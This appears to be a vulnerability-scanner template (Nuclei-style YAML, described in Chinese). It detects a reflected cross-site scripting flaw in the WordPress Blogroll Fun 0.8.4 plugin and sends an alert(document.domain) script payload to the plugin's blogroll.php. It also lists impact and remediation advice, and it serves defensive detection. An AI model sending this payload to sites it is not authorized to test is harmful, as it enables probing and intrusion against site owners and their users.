id: wp-blogroll-fun-xss

info:
  name: WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - 跨站脚本漏洞
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于检测 WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fs...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://codevigilant.com/disclosure/wp-plugin-blogroll-fun-a3-cross-site-scripting-xss/
    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-blogroll-fun-show-last-post-and-last-update-time-cross-site-scripting-0-8-4/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
  tags: wordpress,wp-plugin,xss,unauth,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Got: <script>alert(document.domain)</script><br>'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
